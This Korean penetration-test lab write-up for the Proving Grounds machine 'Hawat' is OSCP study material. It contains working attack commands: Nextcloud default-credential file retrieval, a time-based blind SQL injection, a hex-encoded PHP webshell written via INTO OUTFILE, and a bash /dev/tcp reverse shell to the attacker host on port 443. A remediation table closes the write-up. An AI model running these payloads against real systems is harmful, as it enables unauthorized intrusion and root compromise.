---
tags:
  - type/machine
  - platform/pg
  - os/linux
  - status/solved
  - tech/web/sqli
  - tech/web/webdav
  - tech/web/default-creds
  - tech/db/mysql
  - tech/payload/revshell
type: machine
platform: pg
os: linux
ports: [22, 17445, 30455]
services: [http, ssh]
status: solved
manual_tags: true
tech_count: 5
---
> [!info] PG Practice — Pentester Foundations #11
> **타겟** 192.168.248.147 · **OS** Arch Linux (`hawat`, 5.10.14-arch1-1) · **난이도** Fundamental · **플래그 1개**
> **경로 요약** 50080 Nextcloud(`admin:admin`)에서 소스 zip 확보 → 소스 리뷰로 SQLi 발견 → 17445 Spring 앱에 자가 가입 → **blind SQLi + `INTO OUTFILE`** 로 `/srv/http`에 웹셸 → **nginx·php-fpm이 root로 구동** → 곧바로 root

## 0. 이 박스에서 배우는 것

- **소스 코드를 손에 넣고 읽어서 취약점을 찾는 흐름** — 블랙박스 퍼징이 아니라 화이트박스 리뷰
- **출력 채널이 없는 SQLi**를 다루는 법 — UNION도 에러 기반도 막혔을 때 남는 것
- **`INTO OUTFILE`로 웹셸 쓰기** — 파일 쓰기가 곧 RCE가 되는 조건
- **"어느 웹루트에 써야 root가 되는가"** — 같은 호스트에 웹서버가 여럿이면 실행 주체가 다르다
- **소스와 배포본이 다를 수 있다** — 이 박스에서 실제로 당했다

> [!tip] 시험 출제 가능성
> **높다.** OSCP 시험에는 "소스가 어딘가 노출돼 있고 그걸 읽어야 푸는" 박스가 흔하다(`.git` 유출, 백업 zip, 공개 저장소).
> SQLi → `INTO OUTFILE` → 웹셸도 시험 단골이다. **sqlmap이 금지**이므로 이 노트의 수동 절차가 그대로 시험 자산이다.

---

## 1. 정찰

### Nmap

```bash
┌──(kali㉿kali)-[~/PG/Hawat]
└─$ sudo nmap -sCV -p- -Pn -A --min-rate 5000 -oN nmap.log 192.168.248.147
Not shown: 65527 filtered tcp ports (no-response)
PORT      STATE  SERVICE      VERSION
22/tcp    open   ssh          OpenSSH 8.4 (protocol 2.0)
111/tcp   closed rpcbind
139/tcp   closed netbios-ssn
443/tcp   closed https
445/tcp   closed microsoft-ds
17445/tcp open   http         Apache Tomcat (language: en)
|_http-title: Issue Tracker
30455/tcp open   http         nginx 1.18.0
|_http-title: W3.CSS
50080/tcp open   http         Apache httpd 2.4.46 ((Unix) PHP/7.4.15)
|_http-title: W3.CSS Template
```

> [!danger] **80번 포트가 없다.** `-p-` 전수 스캔을 안 했으면 이 박스는 시작조차 못 한다
> 웹이 전부 **고번호 포트**(17445 · 30455 · 50080)에 있다.
> 시험에서 "웹이 없는 것 같다"고 판단하기 전에 **반드시 전 포트 스캔**을 돌려라. `--min-rate 5000`이면 1분 안에 끝난다.
> 시간이 급하면 `nmap -p- --min-rate 10000 -T4` 로 포트만 먼저 뽑고, 열린 포트에만 `-sCV`를 다시 거는 2단계가 빠르다.

`443/tcp closed`도 눈여겨볼 것 — **아웃바운드는 443만 허용**된다는 사실이 나중에 리버스셸에서 결정적이 된다.

### 포트별 식별

| 포트 | 제품 | 판정 근거 |
|---|---|---|
| 17445 | **Spring Boot 2.4.2 / Java 11 / 내장 Tomcat** — "Issue Tracker" | `pom.xml`의 `spring-boot-starter-parent 2.4.2`, `application.properties`의 `server.port=17445` |
| 30455 | **nginx 1.18.0 + PHP 7.4.15 (FPM)** | `Server:` 헤더, phpinfo의 `Server API = FPM/FastCGI` |
| 50080 | **Apache 2.4.46 + PHP 7.4.15**, `/cloud`에 **Nextcloud 20.0.7.1** | `status.php` → `{"version":"20.0.7.1","productname":"Nextcloud"}` |

![[PG-Hawat-17445_issuetracker.png]]

OS는 **phpinfo의 System 필드**로 확정했다:

```
Linux hawat 5.10.14-arch1-1 #1 SMP PREEMPT Sun, 07 Feb 2021 x86_64
```

> [!tip] **Arch Linux**라는 사실이 경로 관례를 바꾼다
> 데비안/우분투의 `/var/www/html`이 아니라 **`/srv/http`(nginx 기본)** 를 쓴다.
> `phpinfo.php`가 노출돼 있으면 `DOCUMENT_ROOT`·`SCRIPT_FILENAME`·`disable_functions`·`open_basedir`을 한 번에 얻는다. **PHP 박스를 만나면 `phpinfo.php`·`info.php`·`test.php`를 먼저 찔러본다.**

---

## 2. 취약점 분석

### 2-1. 소스를 손에 넣는다

Nextcloud가 `admin:admin`으로 열린다.

![[PG-Hawat-50080_cloud_login.png]]

브라우저로 로그인해서 다운로드해도 되지만, **WebDAV 엔드포인트를 직접 때리는 편이 빠르고 자동화된다**:

```bash
┌──(kali㉿kali)-[~/PG/Hawat]
└─$ curl -u admin:admin -X PROPFIND \
     'http://192.168.248.147:50080/cloud/remote.php/dav/files/admin/' | head -40
    ... issuetracker.zip ...

┌──(kali㉿kali)-[~/PG/Hawat]
└─$ curl -u admin:admin -o issuetracker.zip \
     'http://192.168.248.147:50080/cloud/remote.php/dav/files/admin/issuetracker.zip'
┌──(kali㉿kali)-[~/PG/Hawat]
└─$ md5sum issuetracker.zip && unzip -q issuetracker.zip -d src/
cd816a09d8608c3b24b4e8c5c212640c  issuetracker.zip
```

> [!note] Nextcloud WebDAV 경로 관례
> `/remote.php/dav/files/<사용자명>/` 이 그 사용자의 파일 루트다. `PROPFIND`로 목록, `GET`으로 다운로드, `PUT`으로 업로드가 된다.
> **웹 UI를 거치지 않으므로 세션·CSRF 처리가 불필요**하다. Nextcloud/ownCloud를 만나면 이 경로를 먼저 쓴다.

### 2-2. 취약한 코드

`src/main/java/com/issue/tracker/issues/IssueController.java` 60–85행:

```java
@GetMapping("/issue/checkByPriority")
public String checkByPriority(@RequestParam("priority") String priority, Model model) {
    Properties connectionProps = new Properties();
    connectionProps.put("user", "issue_user");
    connectionProps.put("password", "ManagementInsideOld797");
    try {
        conn = DriverManager.getConnection("jdbc:mysql://localhost:3306/issue_tracker", connectionProps);
        String query = "SELECT message FROM issue WHERE priority='"+priority+"'";   // ← 70행: 문자열 연결
        System.out.println(query);
        Statement stmt = conn.createStatement();
        stmt.executeQuery(query);                                                    // ← 73행: 결과를 버린다
    } catch (SQLException e1) {
        e1.printStackTrace();                                                        // ← 예외를 삼킨다
    }
    List<Issue> issues = service.GetAll();                                           // ← 무조건 전체 목록 렌더
    model.addAttribute("issuesList", issues);
    return "issue_index";
}
```

프로젝트 전체에서 SQL을 문자열로 조립하는 곳은 **여기 한 곳뿐**이다. 나머지는 전부 Spring Data JPA(파라미터 바인딩)라 안전하다:

```bash
┌──(kali㉿kali)-[~/PG/Hawat/src/issuetracker]
└─$ grep -rn -iE 'createQuery|createNativeQuery|Statement|executeQuery|jdbcTemplate|@Query' --include='*.java' .
```

> [!note] 왜 이게 SQL 인젝션인가
> `priority`가 **작은따옴표 문자열 리터럴 안에** 그대로 이어붙는다:
> ```sql
> SELECT message FROM issue WHERE priority='<사용자입력>'
> ```
> 입력에 `'`를 넣으면 문자열이 조기 종료되고, 그 뒤는 **SQL 문법으로 해석**된다.
> `Statement` 대신 `PreparedStatement`에 `?` 바인딩을 썼다면 입력이 데이터로만 취급되어 발생하지 않는다.

### 2-3. 출력 채널이 없다 — 이게 이 박스의 핵심 난점

세 줄이 결정적이다:

| 코드 | 결과 |
|---|---|
| `stmt.executeQuery(query);` — 반환값을 **변수에 담지 않는다** | 쿼리 결과가 화면에 **안 나온다** → **UNION 추출 불가** |
| `catch { e1.printStackTrace(); }` — 예외를 **삼킨다** | 에러 메시지가 응답에 **안 나온다** → **에러 기반 불가** |
| `service.GetAll()` — 주입과 무관하게 **항상 전체 목록** 렌더 | 응답 길이 차이로도 구분 불가 → **Boolean 기반도 어렵다** |

> [!danger] 남는 채널은 둘뿐이다
> 1. **Time-based blind** — `SLEEP()`으로 참/거짓을 **응답 시간**으로 읽는다
> 2. **부작용(side-effect)** — `INTO OUTFILE`로 **파일을 쓴다**
>
> **스택 쿼리(`; DROP ...`)는 안 된다.** MySQL Connector/J는 `allowMultiQueries=false`가 기본이라 세미콜론 뒤가 실행되지 않는다.
> 이 판단을 **소스만 보고 미리** 할 수 있었기에 UNION으로 헤매는 시간을 아꼈다.

### 2-4. 인증 우회 — 자가 가입

`WebSecurityConfig.java`:

```java
.antMatchers("/", "/index", "/register", "/user/register", "/css/**", "/js/**").permitAll()
.anyRequest().authenticated()
...
.csrf().disable()
```

`/issue/checkByPriority`는 인증이 필요한데(**실측: 302 → `/login`**), **`/register`와 `POST /user/register`가 `permitAll`**이다. 즉 **아무나 계정을 만들 수 있다.**

![[PG-Hawat-17445_register.png]]

```bash
┌──(kali㉿kali)-[~/PG/Hawat]
└─$ curl -s -c cj.txt -o /dev/null -w '%{http_code}\n' -X POST \
     -d 'username=pwnaudit&password=Pwn123abc&userId=0' \
     http://192.168.248.147:17445/user/register
302

┌──(kali㉿kali)-[~/PG/Hawat]
└─$ curl -s -c cj.txt -b cj.txt -o /dev/null -w '%{http_code}\n' -X POST \
     -d 'username=pwnaudit&password=Pwn123abc' \
     http://192.168.248.147:17445/login
302
```

> [!warning] `userId=0`을 빼면 **HTTP 400**이 난다
> `Users` 엔티티의 `userId`가 `int`(원시형)라 Spring이 빈 값을 바인딩하지 못한다.
> "가입 폼이 400을 뱉는다 = 막혔다"가 아니라 **필드가 모자란 것**이다. 소스의 엔티티 정의를 보면 즉시 알 수 있다.

> [!tip] `csrf().disable()`은 자동화의 문을 열어준다
> CSRF 토큰이 있으면 매 요청마다 파싱해서 넣어야 한다. 비활성이면 `curl` 한 줄로 끝난다.
> Spring Security 설정을 손에 넣었으면 **`permitAll` 목록과 `csrf()` 상태를 가장 먼저** 본다.

---

## 3. Foothold — blind SQLi로 파일 쓰기

### 3-1. 취약성 확인 (time-based)

> [!danger] ⚠️ 시험 금지 도구 — sqlmap
> 이 단계는 sqlmap이면 자동이지만 **OSCP 시험에서 sqlmap은 금지**다. 아래 수동 절차가 시험용 자산이다.

```bash
┌──(kali㉿kali)-[~/PG/Hawat]
└─$ curl -s -b cj.txt -o /dev/null -w 'baseline %{time_total}s\n' -X POST \
     --data-urlencode "priority=Normal" \
     http://192.168.248.147:17445/issue/checkByPriority
baseline 0.18s

┌──(kali㉿kali)-[~/PG/Hawat]
└─$ curl -s -b cj.txt -o /dev/null -w 'sleep    %{time_total}s\n' -X POST \
     --data-urlencode "priority=Normal' UNION SELECT sleep(5)-- " \
     http://192.168.248.147:17445/issue/checkByPriority
sleep    5.18s
```

**0.18초 → 5.18초.** 정확히 5초가 늘었으니 인젝션이 성립한다.

> [!note] 페이로드 조각 해설
> | 조각 | 역할 |
> |---|---|
> | `Normal` | 원래 값. 쿼리를 문법적으로 자연스럽게 유지 |
> | `'` | 문자열 리터럴을 **조기 종료** |
> | `UNION SELECT sleep(5)` | 원 쿼리(`SELECT message ...`)와 **컬럼 수 1개로 일치**시켜 결합. `sleep(5)`가 5초 지연 |
> | `-- ` | 이후를 주석 처리. **뒤의 공백이 필수** — MySQL은 `--` 다음에 공백/개행이 있어야 주석으로 인식 |
>
> `--data-urlencode`를 쓰는 이유: 페이로드에 `'`·공백·`(`·`)`가 들어가 **직접 인코딩하면 실수하기 쉽다.** curl에게 맡긴다.

### 3-2. 파일 쓰기 가능 여부 확인

`INTO OUTFILE`이 되려면 세 조건이 필요하다 — **던지기 전에 확인**한다:

| 조건 | 확인 방법 |
|---|---|
| DB 사용자에게 `FILE` 권한 | `INTO OUTFILE '/tmp/marker.txt'` 를 실제로 시도 |
| `@@secure_file_priv`가 빈 문자열 | blind로 읽기 |
| 대상 디렉터리가 **mysqld 프로세스 소유자**에게 쓰기 가능 | 여기가 진짜 관문 |

> [!danger] `@@secure_file_priv IS NULL`이 TRUE인데도 쓰기가 됐다
> 교과서대로면 `NULL`은 **파일 입출력 전면 차단**이다. 그런데 실제로는 `load_file()`도 `INTO OUTFILE`도 동작했다.
> **변수값보다 실측을 믿어라.** `/tmp`에 마커 파일을 하나 써보는 것이 가장 빠른 판정이다.

DB 사용자는 소스에서 이미 알고 있다 — **`issue_user` / `ManagementInsideOld797`** (`application.properties`와 컨트롤러에 하드코딩). **root가 아니다.**

### 3-3. 어느 웹루트에 쓸 것인가 — 이 박스의 진짜 함정

웹서버가 둘이라 **쓰는 위치에 따라 웹셸의 실행 권한이 달라진다.**

`/etc/httpd/conf/httpd.conf`를 blind SQLi로 읽어 확인한 결과:

| 포트 | 서버 | DocumentRoot | 디렉터리 권한 | **웹셸 uid** |
|---|---|---|---|---|
| 50080 | Apache + PHP | `/srv/apache` | 0777 | `uid=33(http)` |
| 30455 | **nginx + PHP-FPM** | **`/srv/http`** | 0777 | **`uid=0(root)`** |
| — | (nginx 기본) | `/usr/share/nginx/html` | 0755 root | 쓰기 실패 |

> [!danger] root RCE의 원인은 MySQL이 아니다
> 흔한 오해: "MySQL이 root로 도니까 root 웹셸이 된다."
> **틀렸다.** `ps`로 확인하면 mysqld는 `mysql` 사용자로 돈다. `/root/proof.txt`·`/etc/shadow`를 `load_file()`로 못 읽는 것이 그 증거다.
>
> 진짜 원인은 **`/etc/nginx/nginx.conf`의 `user root;`** 다. nginx와 php-fpm7이 **둘 다 root로 구동**되므로, 30455에 올린 PHP는 무엇이든 uid 0으로 실행된다:
> ```
> root     nginx
> root     php-fpm7
> ```
> **웹셸을 심을 때는 "누가 그 PHP를 실행하는가"를 먼저 확인하라.** `ps aux | grep -E 'nginx|apache|php-fpm'` 한 줄이면 된다.

### 3-4. 웹셸 작성

```sql
Normal' UNION SELECT 0x3c3f7068702073797374656d28245f4745545b22636d64225d293b203f3e INTO OUTFILE '/srv/http/rce.php'-- 
```

> [!tip] 페이로드를 **hex 리터럴**로 넘기는 이유
> 웹셸 원문은 `<?php system($_GET["cmd"]); ?>` 인데, 여기엔 따옴표·`$`·`<`·`>`가 섞여 있다.
> curl → HTTP → JDBC → SQL 파서로 내려가며 **인용이 4중으로 중첩**되어 반드시 깨진다.
> MySQL은 `0x...` 형태의 **hex 문자열 리터럴**을 그대로 받아주므로 인용 문제가 통째로 사라진다.
> ```bash
> echo -n '<?php system($_GET["cmd"]); ?>' | xxd -p | tr -d '\n'
> ```
> [[Squid]]의 `INTO DUMPFILE`, [[Exfiltrated]]의 base64 래핑과 같은 계열의 회피 기법이다.

```bash
┌──(kali㉿kali)-[~/PG/Hawat]
└─$ curl -s 'http://192.168.248.147:30455/rce.php?cmd=id'
uid=0(root) gid=0(root) groups=0(root)
```

**곧바로 root다.** 권한상승 단계가 없다.

> [!note] 파일 앞부분에 쓰레기가 붙는다 — 무해하다
> `UNION`이므로 원 쿼리의 `message` 행들이 먼저 출력되고 그 뒤에 웹셸이 붙는다.
> PHP는 `<?php` 태그 밖을 그냥 텍스트로 출력할 뿐이라 **실행에 지장이 없다.**
> 깔끔하게 하려면 `INTO DUMPFILE`(단일 행, 가공 없음)을 쓴다.

### 3-5. 리버스셸 — 아웃바운드 제약

```bash
┌──(kali㉿kali)-[~/PG/Hawat]
└─$ tmux new-session -d -s hawat 'sudo rlwrap nc -lvnp 443'

┌──(kali㉿kali)-[~/PG/Hawat]
└─$ curl -G --data-urlencode 'cmd=bash -c "bash -i >& /dev/tcp/192.168.45.207/443 0>&1" &' \
     http://192.168.248.147:30455/rce.php
```

```
listening on [any] 443 ...
connect to [192.168.45.207] from (UNKNOWN) [192.168.248.147] 60994
[root@hawat http]# id
uid=0(root) gid=0(root) groups=0(root)
```

> [!danger] 아웃바운드가 443만 열려 있다
> 4444로 리스너를 띄우면 **영영 안 붙는다.** nmap 결과의 `443/tcp closed`(=필터링이 아니라 닫힘)가 힌트였다.
> **리버스셸이 안 붙으면 포트를 의심하라.** 방화벽이 나가는 트래픽을 막는 경우 **443·80·53**이 뚫려 있을 확률이 높다.
> 443 리스너는 1024 미만이라 **`sudo`가 필요**하다.

> [!warning] `python3`가 없다 — TTY 업그레이드 실패
> Arch 최소 설치라 `python3`도 `hostname`도 없다:
> ```
> bash: python3: command not found
> ```
> 대안:
> ```bash
> script -qc /bin/bash /dev/null          # ← 이 박스에서 통한 방법
> perl -e 'exec "/bin/bash";'
> /usr/bin/expect -c 'spawn /bin/bash; interact'
> ```
> **`python3 -c 'import pty...'`를 반사적으로 치지 말고, 없으면 `script`로 넘어가라.**

---

## 4. 권한상승

**없다.** nginx·php-fpm이 root로 구동되므로 웹셸이 곧 root 셸이다.

이건 예외적인 경우가 아니라 **[[Hub]](FuguHub `User=root`)와 같은 패턴**이다. 셸을 잡자마자 `id`를 치는 습관이 여기서 시간을 아껴준다.

```bash
[root@hawat http]# id
uid=0(root) gid=0(root) groups=0(root)
```

---

## 5. 플래그

```bash
[root@hawat http]# cat /root/proof.txt
8f7bb63791bc513b2a25a674068314dc
[root@hawat http]# ls /root
proof.txt
[root@hawat http]# find / -xdev -name local.txt 2>/dev/null
       (없음)
```

| | 위치 | 값 |
|---|---|---|
| `proof.txt` | `/root/proof.txt` | `8f7bb63791bc513b2a25a674068314dc` |
| `local.txt` | **존재하지 않음** | 포털 진행도가 `0/1`이었다 |

`/home`에는 `clinton` 하나뿐이고 dotfile과 `tracker-0.0.1-SNAPSHOT.jar`만 있다. **사용자 단계 없이 root로 직행하는 구성**이다.

> [!tip] 시험 증거 형식 연습
> 실제 시험에서는 플래그를 이렇게 찍어야 인정된다:
> ```bash
> whoami; hostname; ip a; cat /root/proof.txt
> ```
> 이 박스는 `hostname` 바이너리가 없으니 `uname -n` 또는 `cat /etc/hostname`으로 대체한다.

---

## 6. 막혔던 지점 / 시행착오

### ① 소스가 배포본보다 구버전이었다 — 가장 값진 교훈

zip 안의 컨트롤러는 **`@GetMapping`**이었다. 그래서 "GET 요청이 맞다"고 판단했는데, **실제 배포된 jar는 POST만 받는다**:

```
GET  /issue/checkByPriority?priority=Normal            → 405 Method Not Allowed
GET  ...priority=Normal' UNION SELECT sleep(5)--       → 405, 0.17s
POST priority=Normal' UNION SELECT sleep(5)--          → 200, 5.17s
```

> [!danger] **소스 리뷰 결과와 실측이 다르면 실측이 옳다**
> 노출된 소스는 **개발 중 스냅샷**일 수 있다. 배포된 바이너리와 리비전이 다르면 시그니처가 어긋난다.
> 소스는 **"어디에 취약점이 있는가"를 알려주는 지도**이지 **"어떻게 호출하는가"의 정답지가 아니다.**
> 확인법: `/home/clinton/tracker-0.0.1-SNAPSHOT.jar`가 실제 배포본이다. 셸을 잡은 뒤 이걸 디컴파일하면 진짜 코드가 나온다.
>
> **실무 규칙: 소스에서 얻은 정보는 "가설"로 취급하고, 405/400 같은 응답으로 즉시 검증하라.** 405가 나오면 메서드를 바꿔본다 — 그게 이 함정의 탈출구다.

### ② "MySQL이 root"라는 잘못된 전제

`INTO OUTFILE`이 되니 "mysqld가 root겠지" 하고 넘어갈 뻔했다. 확인해보니 아니다:

```bash
[root@hawat http]# ps -o user=,comm= -C mysqld -C mariadbd
mysql    mariadbd
```

`load_file('/root/proof.txt')` → `NULL`, `/etc/shadow` → `NULL`. **mysqld는 root가 아니다.**
쓰기가 된 이유는 단지 **`/srv/http`와 `/srv/apache`가 0777**이었기 때문이고, `/usr/share/nginx/html`(0755 root)에는 조용히 실패했다.

**"쓰기가 됐다"에서 "DB가 root다"를 추론하면 안 된다.** 디렉터리 권한을 봐라.

### ③ `/srv/http/index.html`이 없어서 존재 확인에 실패

웹루트 확인용으로 `index.html`을 요청했는데 404였다. 그 디렉터리에는 `index.php`만 있었다.
**존재 확인은 실제로 있는 파일명으로 하거나, `phpinfo.php`의 `DOCUMENT_ROOT`처럼 직접적인 근거를 써라.**

### ④ 시간 배분

소스 확보와 리뷰에 상당한 시간이 들었지만 **그 덕에 UNION으로 헤매지 않았다.**
시험 상황이라면 — **소스가 손에 들어오는 정황(zip·`.git`·백업)이 보이면 먼저 확보하는 것이 이득**이다. 블랙박스로 blind SQLi를 찾는 것보다 훨씬 빠르다.

---

## 7. OSCP 시험 관점

1. **`-p-` 전수 스캔은 타협하지 마라.** 이 박스는 80이 없고 웹이 전부 고번호 포트다. 기본 1000포트 스캔이면 SSH만 보고 끝난다. 급하면 2단계(`-p-`로 포트만 → 열린 포트에 `-sCV`)로 나눠라.
2. **`443/tcp closed`를 리버스셸 힌트로 읽어라.** 아웃바운드가 443만 열린 경우 4444 리스너는 영영 안 붙는다. **안 붙으면 443·80·53을 시도**한다. 1024 미만은 `sudo` 필요.
3. **소스가 노출된 정황이 보이면 먼저 확보한다.** Nextcloud·`.git`·백업 zip. 화이트박스가 블랙박스보다 압도적으로 빠르다.
4. **소스와 배포본이 다를 수 있다.** 소스는 지도이지 정답지가 아니다. **405/400 응답이 나오면 메서드·파라미터를 바꿔 실측하라.**
5. **⚠️ sqlmap 금지 → 수동 blind SQLi 절차를 익혀라.**
   - 확인: `' UNION SELECT sleep(5)-- ` 후 응답 시간 비교
   - 컬럼 수 맞추기: `ORDER BY n` 또는 `UNION SELECT 1,2,3...`
   - 추출: `IF(condition, sleep(5), 0)` 로 한 글자씩 이진 탐색
   - 파일 쓰기: `INTO OUTFILE` / `INTO DUMPFILE`
6. **출력 채널이 없는 SQLi를 소스로 미리 판별하라.** `executeQuery` 결과를 버리고 예외를 삼키면 → UNION·에러 기반 둘 다 죽는다. **time-based와 부작용만 남는다**는 판단을 미리 내리면 시간을 크게 아낀다.
7. **`INTO OUTFILE` 전에 3가지를 확인한다** — `FILE` 권한 · `@@secure_file_priv` · **대상 디렉터리의 쓰기 권한**. 셋 중 디렉터리 권한이 실질적 관문이다. 단 **변수값보다 실측(마커 파일 쓰기)이 우선**이다.
8. **웹셸을 심기 전에 "누가 그 PHP를 실행하는가"를 확인하라.** `ps aux | grep -E 'nginx|apache|php-fpm'`. 같은 호스트에 웹서버가 둘이면 실행 uid가 다를 수 있고, **root로 도는 쪽에 심으면 권한상승이 통째로 생략**된다.
9. **인용이 중첩되면 hex 리터럴이나 base64로 회피한다.** `0x3c3f706870...` / `echo <b64>|base64 -d`. ([[Squid]] · [[Exfiltrated]]와 동일 패턴)
10. **`python3`가 없을 때의 TTY 업그레이드**: `script -qc /bin/bash /dev/null`. Arch·Alpine·최소 설치에서 흔하다.
11. **Spring Security를 손에 넣으면 `permitAll` 목록과 `csrf()` 상태부터 본다.** 자가 가입이 열려 있으면 인증은 장애물이 아니다.

---

## 8. 방어 관점

| 결함 | 조치 |
|---|---|
| SQL 문자열 연결 | `PreparedStatement` + `?` 바인딩. JPA를 쓰면서 한 곳만 raw로 남긴 것이 사고의 원인 |
| DB 자격증명 하드코딩 | 소스에 평문으로 박지 말고 환경변수/시크릿 관리자 사용. 소스 유출 시 즉시 크리덴셜 유출로 이어진다 |
| **nginx·php-fpm이 root로 구동** | `user http;`로 비특권 계정 지정. **이 하나만 고쳤어도 root RCE가 아니라 웹 사용자 RCE에 그쳤다** |
| 웹루트 0777 | 웹서버 사용자만 읽기, 쓰기는 배포 계정으로 제한 |
| DB 계정에 `FILE` 권한 | 애플리케이션 계정에서 `FILE` 회수. `secure_file_priv`를 명시적 디렉터리로 설정 |
| Nextcloud `admin:admin` | 기본 자격증명 변경. 소스 아카이브를 공유 스토리지에 두지 않기 |
| 자가 가입 개방 | 관리자 승인 또는 초대 기반으로 전환 |

---

## 9. 참고 자료

- CVE 없음 — **커스텀 애플리케이션의 SQL 인젝션**이다(OWASP A03: Injection)
- MySQL `INTO OUTFILE` / `secure_file_priv`: https://dev.mysql.com/doc/refman/8.0/en/server-system-variables.html#sysvar_secure_file_priv
- Nextcloud WebDAV: `/remote.php/dav/files/<user>/`
- TTY 업그레이드 대안: `script -qc /bin/bash /dev/null`

## 남긴 흔적

| 항목 | 상태 |
|---|---|
| `/srv/http/rce.php` (root 웹셸) | 남아 있음 — 랩 Stop/Revert로 소멸 |
| `/srv/apache/rce.php` (http uid 웹셸) | 남아 있음 |
| DB `issue_tracker.user`에 `pwnaudit` 계정 | 남아 있음 |
| `/tmp/hwt_marker.txt`, `/tmp/jx/` | **삭제 완료** |

획득 자격증명: `issue_user` / `ManagementInsideOld797` (MySQL), Nextcloud `admin` / `admin`.

## 관련 노트

- [[_WRITEUP-STANDARD]] — 이 노트의 작성 기준
- [[Hub]] — 서비스가 root로 구동되어 권한상승이 없던 동일 패턴
- [[Squid]] — `INTO DUMPFILE` + hex 리터럴로 웹셸 작성
- [[Exfiltrated]] — 인용 중첩을 base64로 회피
- [[01. Pentest Foundations]] — Hawat 항목
